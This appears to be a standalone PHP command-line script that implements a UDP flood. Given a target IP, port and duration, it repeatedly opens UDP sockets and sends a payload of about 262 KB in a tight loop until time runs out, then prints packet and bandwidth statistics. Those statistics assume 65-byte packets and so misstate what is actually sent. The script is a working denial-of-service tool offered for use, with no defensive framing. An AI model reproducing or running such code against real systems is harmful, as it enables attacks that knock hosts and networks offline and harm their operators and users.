<?php

include_once './common.php';

class udp
{

    private $packets = 0;
    private $ip;
    private $port;
    private $exec_time;
    private $time;

    public function __construct() {
        set_time_limit(0);
        ignore_user_abort(FALSE);
        parseArgv($this->ip, $this->port, $this->exec_time);
        $this->time = time();
    }

    public function run() {
        cli_echo('Udp running', __CLASS__);
        $max_time = $this->time + $this->exec_time;
        $out = '';
        for($i = 0; $i < 65535; $i++){
            $out .= "data";
        }
        while(1) {
            $this->packets++;
            if(time() > $max_time){
                break;
            }

            $fp = fsockopen("udp://$this->ip", $this->port, $errno, $errstr, 5);
            if($fp){
                fwrite($fp, $out);
                fclose($fp);
            }
        }

        cli_echo('Udp close', __CLASS__);
        cli_echo("Package: {$this->packets}", __CLASS__);
        cli_echo('Flow: ' . round(($this->packets * 65 * 8) / (1024 * 1024),2) . 'Mbps', __CLASS__);
        cli_echo('Byte: ' . $this->packets . '(' . round(($this->packets * 65 * 8) / (1024 * 1024),2) . 'Mbps)', __CLASS__);
        cli_echo('Packets averaging: ' . round($this->packets/$this->exec_time, 2) . ' packets/s', __CLASS__);
    }
}
(new udp())->run();